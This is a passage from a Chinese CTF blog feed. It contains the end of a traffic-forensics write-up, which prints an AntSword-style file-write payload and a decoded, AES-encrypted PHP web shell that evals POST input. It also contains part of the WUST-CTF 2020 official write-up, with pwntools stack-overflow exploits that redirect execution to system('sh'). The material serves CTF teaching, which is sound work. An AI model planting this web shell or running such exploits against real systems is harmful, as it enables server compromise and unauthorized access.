class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>&#125;<br>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asoutput</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;17dc23&quot;</span>;<br><span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">asenc</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;f890355d3c&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;j6b36f516d1adf&quot;</span>]);<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;oc86831f79ec72&quot;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$buf</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>);<span class="hljs-variable">$i</span>+=<span class="hljs-number">2</span>)<span class="hljs-variable">$buf</span>.=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">2</span>));<br><span class="hljs-keyword">echo</span>(@<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$f</span>,<span class="hljs-string">&quot;a&quot;</span>),<span class="hljs-variable">$buf</span>)?<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>);<br>;<br>&#125;<br><span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR://&quot;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br>;<br><span class="hljs-title function_ invoke__">asoutput</span>();<br><span class="hljs-keyword">die</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸€æ®µè§£ç çš„å¼•èµ·äº†æ³¨æ„ï¼Œå°†å‚æ•°é‡Œ <code>$c=$_POST[&quot;oc86831f79ec72&quot;];</code> è¿›è¡Œè§£ç ï¼Œå¯ä»¥å¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$params</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯æ¯”è¾ƒå…³é”®çš„ä»£ç äº†ï¼Œé¦–å…ˆä¼  <code>pass</code> è®¾ç½® <code>SESSION</code>ï¼Œè¿™æ˜¯ <code>AES</code> çš„å¯†é’¥ï¼Œæˆ‘ä»¬æŸ¥åˆ°æµé‡åŒ…æœ‰ä¸¤ä¸ªä¼  <code>pass</code> çš„ï¼Œæœ€åä¸€ä¸ªå¾—åˆ°çš„ key å°±æ˜¯åé¢æˆ‘ä»¬ç”¨æ¥è§£å¯†çš„ <code>AES</code> å¯†é’¥ã€‚<img src="https://img.tucang.cc/api/image/show/c05e934d07d4e9035852492fd7fd2528" alt="image-20200527214324885"></p><p>å¯ä»¥çŸ¥é“ <code>key</code> &#x3D; <code>91ee1bfc4fd27c90</code>ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¡¬è§£åé¢çš„æµé‡åŒ…äº†ã€‚å‘ç°æ‰§è¡Œäº† <code>ln -s /flag jquery.min.js</code> ï¼Œè¿™æ · <code>jquery.min.js</code> å°±æŒ‡å‘äº† flagï¼Œè¯»å®ƒå°±å¾—åˆ°äº†flag<code>(tcp.stream eq 6)</code></p><p><img src="https://img.tucang.cc/api/image/show/68ef8008264fa16a6c82f7bb79c7dfa9" alt="image-20200527215003442"></p><p>æœ€ååœ¨ <code>tcp.stream eq 7</code> é‡Œçš„å›åº”é‡Œè§£å¯†å¯ä»¥å¾—åˆ°ç»“æœçš„ base64ï¼Œç»“æœè§£ç å°±æ˜¯flagäº†ã€‚</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$post</span>=<span class="hljs-string">&quot;5U+SIO3pbt0CXFm7gLAx3xT7q0qDPFaCK8lNevS6Nrmak6Hhj9PXx3ZlGnMIgkqnqHmf6ba5VvtRMgJP6wUtoMXx5WeYJvobewjKDmZ8sSUCZJhKzzkX2ISKKy/snPv+6UOh5rBo6j/JvFGUOUjkKCbCe+nEGD9EKyv10Uu9KHU=&quot;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;91ee1bfc4fd27c90&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/71c6d2fc7a2d3f1619716a99aed09458" alt="image-20200527215208860"></p><p><img src="https://img.tucang.cc/api/image/show/93c1bb0c9d0d0413d810b70f1e51d4dd" alt="image-20200527215228699"></p><p>æ€»ä½“æ¥è¯´è¿˜æ˜¯æŒºå¥½ç©çš„ï¼Œæ€»ç»“äº†ä¸€äº›æ€è·¯å¯ä»¥å›å»è®­ç»ƒæ–°äººï¼Œæ­¦å¤§çš„å¸ˆå‚…è¿˜æ˜¯å¾ˆå¼ºï¼Œå‰©ä¸‹ä¸¤é¢˜webä¹Ÿæ²¡å’‹çœ‹ï¼Œjsè¿˜æ˜¯ç¡¬ä¼¤ä¸æ€ä¹ˆä¼šï¼Œç•™ä¸ªå‘ä»¥åæ…¢æ…¢è¡¥ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WUST-CTF 2020 å®˜æ–¹ Writeup</title>
    <link href="/2020/03/30/wctf2020_official_wp/"/>
    <url>/2020/03/30/wctf2020_official_wp/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å»å¹´12æœˆä»½å·¦å³ï¼Œçªç„¶å½¼å¾—ä¸€æ¿€çµï¼Œæƒ³å¼„ä¸ªèŒæ–°èµ›ç»™å¤§ä¸€å¤§äºŒçš„æ‰“æ‰“ï¼Œä¸ç„¶å¤§å®¶å¹³æ—¶éƒ½æ²¡å•¥æœºä¼šæ‰“æ¯”èµ›ï¼ˆæ¯•ç«Ÿç°åœ¨æ¯”èµ›éƒ½æ˜¯æŠŠèŒæ–°éª—è¿›æ¥æ€ï¼Œä¸€ç‚¹ä¸å‹å¥½ï¼‰ã€‚ç„¶åå¼€å§‹æƒ³èµ›åˆ¶ï¼Œå¥–åŠ±ï¼Œç­–åˆ’ï¼Œå‡ºé¢˜â€¦ ç»è¿‡äº†å„ç§ç”³è¯·å’Œä¿®æ”¹ï¼Œç»ˆäºç”³è¯·æˆåŠŸäº†ï¼Œä¹Ÿå°±æœ‰äº†å­¦æ ¡çš„ç¬¬ä¸€ä¸ªCTFã€‚ä¸€å¼€å§‹æ²¡æœ‰æƒ³åˆ°ä¼šæœ‰é‚£ä¹ˆå¤šå¤–æ ¡çš„å¸ˆå‚…æ¥æ‰“ï¼Œæ‰€ä»¥åœ¨ç¯å¢ƒï¼Œé¢˜ç›®è®¾ç½®ä¸Šä¼šå‡ºç°ä¸€äº›å¤§å¤§å°å°çš„é—®é¢˜ï¼ŒåŠ ä¸Šé¢˜ç›®å¯èƒ½å¯¹å¾ˆå¤šå¸ˆå‚…æ¥è¯´å¤ªç®€å•äº†ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬è§è°…ã€‚æ„Ÿè°¢å„ä½å¸ˆå‚…çš„æ§åœºï¼Œä½ ä»¬è®¤çœŸåšå°±æ˜¯å¯¹å‡ºé¢˜äººæœ€å¥½çš„è¯„ä»·ã€‚æ„Ÿè°¢å„è·¯å¸ˆå‚…æŠ•ç¨¿çš„ writeupï¼Œè¿™ç¯‡ writeup ä½œä¸ºå®˜æ–¹ writeupï¼Œå°±ä»¥å‡ºé¢˜äººçš„è§’åº¦æ¥å†™ã€‚</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="getshell-33-solves"><a href="#getshell-33-solves" class="headerlink" title="getshell - 33 solves"></a>getshell - 33 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;E@sy_get_shel1&#125;</code></p><p><strong>ç¨‹åºåˆ†æ</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GndqxJ.png" alt="GndqxJ.png"></p><p>å¼€å¯æ ˆä¸å¯æ‰§è¡Œï¼Œæ²¡æœ‰ canaryï¼ŒPIE ä¿æŠ¤</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndza6.png" alt="Gndza6.png"></p><p>å…·ä½“æ¼æ´åœ¨<code>vulnerable</code>å‡½æ•°ä¸­ï¼Œæ ˆæº¢å‡ºï¼Œæº¢å‡º<code>0x20-0x18</code>å¯è¦†ç›–8ä¸ªå­—èŠ‚ï¼Œå³åˆšå¥½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œç”±äºç¨‹åºå†…ç½®åé—¨</p><p><img src="https://s1.ax1x.com/2020/03/30/GndOM9.png" alt="GndOM9.png"></p><p>è¿”å›åœ°å€è®¾ç½®æˆ<code>0x0804851B</code>å³å¯</p><p><strong>EXP</strong></p><p>å’Œä¹‹å‰æ¢ä¹èµ›ä¸€æ ·ï¼Œæˆ‘çš„expéƒ½æ˜¯ä¸€ä¸ªdemo copyå‡ºæ¥çš„ï¼Œä¸»è¦çœ‹<code># todo here</code>ä¸‹é¢çš„å†…å®¹å°±å¥½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;getshell&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =&#x27;0.0.0.0&#x27;</span><br><span class="hljs-string">Port =2333</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&quot;\\ \n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0x0804851B</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="getshell2-7-solves"><a href="#getshell2-7-solves" class="headerlink" title="getshell2 - 7 solves"></a>getshell2 - 7 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Sh_Als0_w0rks&#125;</code></p><p><strong>ç¨‹åºåˆ†æ</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GndxVx.png" alt="GndxVx.png"></p><p>å’Œå‰é¢é‚£ä¸ªç¨‹åºçš„ä¿æŠ¤ä¸€æ ·</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndb24.png" alt="Gndb24.png"></p><p>å…·ä½“æ¼æ´åœ¨<code>vulnerable</code>å‡½æ•°ä¸­ï¼Œæ ˆæº¢å‡ºï¼Œæº¢å‡º<code>0x24-0x18</code>å¯è¦†ç›–0xCä¸ªå­—èŠ‚ï¼Œå¯è¦†ç›–è¿”å›åœ°å€å’Œå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°</p><p>ä½†æ˜¯ç¨‹åºçš„åé—¨æ˜¯è¿™æ ·çš„</p><p><img src="https://s1.ax1x.com/2020/03/30/GndHGF.png" alt="GndHGF.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/Gnd7PU.png" alt="Gnd7PU.png"></p><p>å¾ˆæ˜¾ç„¶<code>/bbbbbbbbin_what_the_f?ck__--??/sh</code>ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸è·¯å¾„ï¼Œåƒä¹‹å‰é‚£æ ·è®¾ç½®è¿”å›åœ°å€åˆ°è¿™ä¸ªå‡½æ•°ç›´æ¥å»æ‰§è¡Œè‚¯å®šä¼šå¤±è´¥ï¼Œæ­¤æ—¶å°±éœ€è¦çŸ¥é“ç¯å¢ƒå˜é‡ä¸­çš„<code>PATH</code>æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä»¥åŠshè¿™ä¸ªshellç¨‹åºæ˜¯æ€ä¹ˆè¢«<code>system</code>æ‰¾åˆ°ç„¶åè°ƒç”¨çš„(è‡ªè¡Œç™¾åº¦å§â€¦è¿™é‡Œä¸è§£é‡Šäº†)</p><p>çŸ¥é“äº†PATHä¹‹å<br>å› ä¸ºæˆ‘ä»¬ç¨‹åºä¸­å‡½æ•°è°ƒç”¨å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œéƒ½æ˜¯é€šè¿‡å­—ç¬¦ä¸²æŒ‡é’ˆè°ƒç”¨çš„</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndjq1.png" alt="Gndjq1.png"></p><p>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨è¯¥å­—ç¬¦ä¸²ä¸­<code>sh</code>åœ°å€(0x08048670)çš„ä½œä¸ºå‚æ•°ç„¶åå°†è¿”å›åœ°å€ç›´æ¥è®¾ç½®æˆ<code>call system</code>çš„åœ°å€(0x08048529)å³å¯</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;getshell-2&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br><span class="hljs-comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span><br><br>Host =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>Port =<span class="hljs-number">2334</span><br>p = remote(Host,Port)<br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&quot;\\ \n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0x08048529</span>)+p32(<span class="hljs-number">0x08048670</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="number-game-16-solves"><a href="#number-game-16-solves" class="headerlink" title="number_game - 16 solves"></a>number_game - 16 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Opc0de_neg_Is_StraNge&#125;</code></p><p><strong>ç¨‹åºåˆ†æ</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwtoV.png" alt="GnwtoV.png"></p><p>psï¼šè¿™é‡Œv2æ˜¯canaryï¼Œå‰é¢ä¸¤ä¸ªç¨‹åºéƒ½æ²¡æœ‰å¼€å¯è¿™ä¸ªä¿æŠ¤æ‰€ä»¥çœ‹ä¸åˆ°</p><p>è¿™é‡Œçš„æ„æ€å¤§è‡´å°±æ˜¯è¾“å…¥ä¸€ä¸ªintæ•´æ•°ï¼Œä¸¤æ¬¡åˆ¤æ–­<code>v1</code>æ˜¯å¦å°äºé›¶ï¼Œéƒ½æ»¡è¶³çš„è¯å°±ç»™å‡ºä¸€ä¸ªshellï¼Œä½†æ˜¯ä¸­é—´åšäº†ä¸€æ¬¡<code>v1=-v1</code>çš„æ“ä½œ</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwYd0.png" alt="GnwYd0.png"></p><p>è¿™ä¸ªæ“ä½œæ˜¯é€šè¿‡negæŒ‡ä»¤å®ç°çš„ï¼Œè¿™é‡Œè¿™ä¸ªæŒ‡ä»¤çš„æ“ä½œæ˜¯å°†eaxæŒ‰ä½æ±‚åç„¶å+1ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¢«æ“ä½œä¹‹åçš„eaxæœ€é«˜ä½ä»æœª1ï¼ˆä¿æŒè¿™ä¸ªæ•°ä¸ºè´Ÿï¼‰ï¼Œä¹‹å‰eaxå°±åªèƒ½æ˜¯<code>1000000...0</code>ï¼Œå³æœ€é«˜ä½ä¸º1ç„¶åå…¶ä½™ä½å…¨ä¸º0ï¼Œè¿™ä¸ªæ•°åœ¨4å­—èŠ‚çš„è¡¨è¿°ä¸‹å°±æ˜¯è¿™æ ·çš„</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwDy9.png" alt="GnwDy9.png"></p><p>ç”¨<code>scanf</code>è¾“å…¥è¿™ä¸ªæ•°å°±å¯ä»¥æ»¡è¶³äº†</p><h2 id="Closed-10-solves"><a href="#Closed-10-solves" class="headerlink" title="Closed - 10 solves"></a>Closed - 10 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;A_pr@ctical_Trick&#125;</code></p><p><strong>ç¨‹åºåˆ†æ</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwrLR.png" alt="GnwrLR.png"></p><p>è¿™ä¸ªé¢˜çš„ç›®çš„å°±æ˜¯æƒ³è®©ä½ ä»¬å­¦ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ–‡ä»¶æè¿°ç¬¦è¿˜æœ‰è¾“å‡ºé‡å®šä½çš„çŸ¥è¯†ï¼ˆå…·ä½“å°±è‡ªè¡Œç™¾åº¦å§ï¼‰</p><p>è¿™ä¸ªç¨‹åºè™½ç„¶ç»™å‡ºäº†shellï¼Œä½†æ˜¯åœ¨ä¹‹å‰å…³é—­äº†è¿›ç¨‹æ ‡å‡†è¾“å‡º<code>1</code>å’Œæ ‡å‡†é”™è¯¯è¾“å‡º<code>2</code>ï¼Œæ‰€ä»¥getshellåè‡ªç„¶ä¹Ÿæ— æ³•è¾“å‡ºå†…å®¹</p><p>è¿™é‡Œä»‹ç»ä¸€ä¸ªå°trickï¼šå°†æ ‡å‡†è¾“å‡ºé‡å®šä½åˆ°æ ‡å‡†è¾“å…¥<code>0</code>ï¼Œä¹Ÿå¯ä»¥å®ç°å›æ˜¾ï¼Œå…·ä½“è§<a href="https://unix.stackexchange.com/questions/177228/behaviour-of-10-in-bash">è¿™é‡Œ</a></p><p>è¿è¡Œç¨‹åºä¹‹å<code>sh 1&gt;&amp;0</code>å³å¯å®ç°å›æ˜¾</p><h2 id="NameYourCat-4-solves"><a href="#NameYourCat-4-solves" class="headerlink" title="NameYourCat - 4 solves"></a>NameYourCat - 4 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Cats_Are_Cute_right?&#125;</code></p><p><strong>ç¨‹åºåˆ†æ</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/Gnwye1.png" alt="Gnwye1.png"></p><p>å¼€å¯äº†canaryè¿˜æœ‰æ ˆä¸å¯æ‰§è¡Œï¼Œæ²¡æœ‰PIE</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnw6dx.png" 